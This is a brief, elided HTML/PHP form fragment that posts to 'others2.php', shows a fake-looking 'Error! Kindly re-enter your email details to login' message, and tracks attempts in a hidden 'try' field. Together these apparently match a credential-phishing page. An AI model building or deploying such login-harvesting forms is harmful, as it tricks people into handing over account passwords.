...
<form action="others2.php" method="post">
<br><fieldset>
<br><br>
...
<div id="err"><b>Error!</b> Kindly re-enter your email details to login.</div>
<br><br>
...
<input type="hidden" name="try" value="<?php echo $try;?>"><br><br>
